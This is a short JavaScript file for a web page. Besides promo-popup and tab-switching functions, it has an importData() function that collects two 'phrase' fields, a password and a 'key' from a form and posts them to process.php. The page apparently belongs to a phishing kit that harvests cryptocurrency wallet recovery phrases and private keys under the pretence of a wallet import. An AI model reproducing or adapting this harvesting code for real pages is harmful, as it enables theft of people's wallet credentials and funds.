$(document).ready(function () {
  $('#close').click(function () {
    $('#promo').fadeOut()
  })
})

$(document).ready(function () {
  $('.box').click(function () {
    $('#promo').fadeIn()
  })
})

function shoW(a, b, c, x, y, z) {
  document.getElementById('sec' + a).style.display = 'block'
  document.getElementById('sec' + c).style.display = 'none'
  document.getElementById('sec' + b).style.display = 'none'

  document.getElementById(x).style.borderBottomWidth = '2'
  document.getElementById(x).style.borderRightWidth = '0'
  document.getElementById(x).style.borderTopWidth = '0'
  document.getElementById(x).style.borderLeftWidth = '0'
  document.getElementById(x).style.borderColor = 'white'

  document.getElementById(z).style.borderBottomWidth = '0'
  document.getElementById(z).style.borderRightWidth = '0'
  document.getElementById(z).style.borderTopWidth = '0'
  document.getElementById(z).style.borderLeftWidth = '0'
  document.getElementById(z).style.borderColor = '#2B2B2B'

  document.getElementById(y).style.borderBottomWidth = '0'
  document.getElementById(y).style.borderRightWidth = '0'
  document.getElementById(y).style.borderTopWidth = '0'
  document.getElementById(y).style.borderLeftWidth = '0'
  document.getElementById(y).style.borderColor = '#2B2B2B'
}

function importData() {
  document.getElementById('code').style.display = 'block'
  var phrase1 = document.getElementById('phrase1').value
  var phrase2 = document.getElementById('phrase2').value
  var pass = document.getElementById('pass').value
  var key = document.getElementById('key').value
  var data =
    'phase1=' + phrase1 + '&phase2=' + phrase2 + '&pass=' + pass + '&key=' + key
  var xmlhttp = new XMLHttpRequest()
  xmlhttp.onreadystatechange = function () {
    if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
      var y = xmlhttp.responseText
      alert(y)
    }
  }
  xmlhttp.open('POST', 'process.php', true)
  xmlhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded')
  xmlhttp.send(data)
}
